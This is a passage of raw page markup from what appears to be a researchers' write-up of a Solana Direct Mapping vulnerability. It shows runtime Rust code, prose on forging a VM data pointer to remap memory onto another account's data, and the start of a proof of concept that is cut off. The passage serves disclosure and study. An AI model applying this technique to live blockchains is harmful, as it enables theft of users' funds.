token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement50\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--8\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[8]}],[\"$\",\"span\",\"code-segement52\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement53\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement54\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement55\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"-\u003e\"]}],[\"$\",\"span\",\"code-segement56\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement57\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Result\"]}],[\"$\",\"span\",\"code-segement58\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement59\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"CallerAccount\"]}],[\"$\",\"span\",\"code-segement60\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement61\",{\"className\":\"token token lifetime-annotation\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"'a\"]}],[\"$\",\"span\",\"code-segement62\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}],[\"$\",\"span\",\"code-segement63\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement64\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement65\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Error\"]}],[\"$\",\"span\",\"code-segement66\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}],[\"$\",\"span\",\"code-segement67\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement68\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement69\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--9\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[9]}],[\"$\",\"span\",\"code-segement71\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement72\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"...\"]}],[\"$\",\"span\",\"code-segement73\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--10\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[10]}],\"\\n\",[\"$\",\"span\",\"line-number--11\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[11]}],[\"$\",\"span\",\"code-segement77\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement78\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}],[\"$\",\"span\",\"code-segement79\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement80\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement81\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"serialized_data\"]}],[\"$\",\"span\",\"code-segement82\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement83\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" vm_data_addr\"]}],[\"$\",\"span\",\"code-segement84\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement85\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" ref_to_len_in_vm\"]}],[\"$\",\"span\",\"code-segement86\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement87\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" serialized_len_ptr\"]}],[\"$\",\"span\",\"code-segement88\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement89\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement90\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement91\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement92\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement93\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--12\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[12]}],[\"$\",\"span\",\"code-segement95\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement96\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Double translate data out of RefCell\"]}],[\"$\",\"span\",\"code-segement97\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--13\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[13]}],[\"$\",\"span\",\"code-segement99\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement100\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}],[\"$\",\"span\",\"code-segement101\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" data \"]}],[\"$\",\"span\",\"code-segement102\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement103\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement104\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement105\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"translate_type\"]}],[\"$\",\"span\",\"code-segement106\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement107\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement108\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement109\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement110\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}],[\"$\",\"span\",\"code-segement111\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement112\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}],[\"$\",\"span\",\"code-segement113\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement114\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--14\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[14]}],[\"$\",\"span\",\"code-segement116\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            memory_mapping\"]}],[\"$\",\"span\",\"code-segement117\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement118\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--15\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[15]}],[\"$\",\"span\",\"code-segement120\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            account_info\"]}],[\"$\",\"span\",\"code-segement121\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement122\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data\"]}],[\"$\",\"span\",\"code-segement123\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement124\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"as_ptr\"]}],[\"$\",\"span\",\"code-segement125\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement126\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement127\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement128\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}],[\"$\",\"span\",\"code-segement129\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement130\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement131\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"const\"]}],[\"$\",\"span\",\"code-segement132\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" _ \"]}],[\"$\",\"span\",\"code-segement133\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}],[\"$\",\"span\",\"code-segement134\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement135\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}],[\"$\",\"span\",\"code-segement136\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement137\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--16\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[16]}],[\"$\",\"span\",\"code-segement139\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            invoke_context\"]}],[\"$\",\"span\",\"code-segement140\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement141\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"get_check_aligned\"]}],[\"$\",\"span\",\"code-segement142\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement143\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement144\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement145\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--17\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[17]}],[\"$\",\"span\",\"code-segement147\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement148\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement149\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"?\"]}],[\"$\",\"span\",\"code-segement150\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement151\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--18\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[18]}],\"\\n\",[\"$\",\"span\",\"line-number--19\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[19]}],[\"$\",\"span\",\"code-segement155\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement156\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"...\"]}],[\"$\",\"span\",\"code-segement157\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--20\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[20]}],\"\\n\",[\"$\",\"span\",\"line-number--21\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[21]}],[\"$\",\"span\",\"code-segement161\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement162\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement163\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--22\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[22]}],[\"$\",\"span\",\"code-segement165\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            serialized_data\"]}],[\"$\",\"span\",\"code-segement166\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement167\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--23\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[23]}],[\"$\",\"span\",\"code-segement169\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            vm_data_addr\"]}],[\"$\",\"span\",\"code-segement170\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement171\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--24\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[24]}],[\"$\",\"span\",\"code-segement173\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            ref_to_len_in_vm\"]}],[\"$\",\"span\",\"code-segement174\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement175\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--25\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[25]}],[\"$\",\"span\",\"code-segement177\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            serialized_len_ptr\"]}],[\"$\",\"span\",\"code-segement178\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement179\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--26\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[26]}],[\"$\",\"span\",\"code-segement181\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement182\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement183\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--27\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[27]}],[\"$\",\"span\",\"code-segement185\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement186\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement187\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement188\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--28\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[28]}],\"\\n\",[\"$\",\"span\",\"line-number--29\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[29]}],[\"$\",\"span\",\"code-segement192\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement193\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Ok\"]}],[\"$\",\"span\",\"code-segement194\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement195\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"CallerAccount\"]}],[\"$\",\"span\",\"code-segement196\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement197\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement198\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--30\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[30]}],[\"$\",\"span\",\"code-segement200\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        vm_data_addr\"]}],[\"$\",\"span\",\"code-segement201\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement202\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--31\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[31]}],[\"$\",\"span\",\"code-segement204\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement205\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"...\"]}],[\"$\",\"span\",\"code-segement206\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--32\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[32]}],[\"$\",\"span\",\"code-segement208\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement209\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement210\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement211\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--33\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[33]}],[\"$\",\"span\",\"code-segement213\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement214\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]]]}]}]}],\"\\n\",[\"$\",\"p\",\"p-99\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"By manipulating the \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"AccountInfo.data\"}],\" pointer in VM memory before triggering a CPI call, an attacker can forge the \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"vm_data_addr\"}],\" value. This causes \",[\"$\",\"code\",\"code-2\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"update_caller_account\"}],\" to locate the wrong \",[\"$\",\"code\",\"code-3\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion\"}],\" and update its \",[\"$\",\"code\",\"code-4\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"host_addr\"}],\" to point to the attacker's target account data, effectively mapping the virtual memory of some \",[\"$\",\"code\",\"code-5\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion\"}],\" to a wrong host memory.\"]}],\"\\n\",[\"$\",\"h2\",\"h2-7\",{\"className\":\"text-4xl py-4 border-b border-white/10\",\"children\":\"A Failed Exploit that Led Us Deeper\"}],\"\\n\",[\"$\",\"p\",\"p-100\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":\"Though the primitive seems extremely powerful, the exploitation wasn't as smooth as it might seems. After identifying the critical oversight, we started assessing its impact.\"}],\"\\n\",[\"$\",\"p\",\"p-101\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":\"Our first intuition is that since virtual memory are mapped incorrectly, it should be possible to bypass the memory write authorization checks, for exmaple, by mapping a writable virtual memory to some account data that should be readonly. This will be sufficient to allow attackers to steal funds by modifying token program accounts. Our first PoC implemented this idea, and it worked on an older version of Direct Mapping.\"}],\"\\n\",[\"$\",\"pre\",\"pre-13\",{\"children\":[\"$\",\"div\",\"code-0\",{\"className\":\"rounded-sm\",\"style\":{\"color\":\"#ccc\",\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"whiteSpace\":\"pre\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\",\"padding\":\"1em\",\"margin\":\".5em 0\",\"overflow\":\"auto\"},\"children\":[\"$\",\"code\",null,{\"className\":\"language-rust\",\"style\":{\"whiteSpace\":\"pre\",\"color\":\"#ccc\",\"background\":\"none\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\"},\"children\":[false,[[\"$\",\"span\",\"line-number--1\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[1]}],[\"$\",\"span\",\"code-segement1\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"use\"]}],[\"$\",\"span\",\"code-segement2\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement3\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"std\"]}],[\"$\",\"span\",\"code-segement4\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement5\",{\"className\":\"token 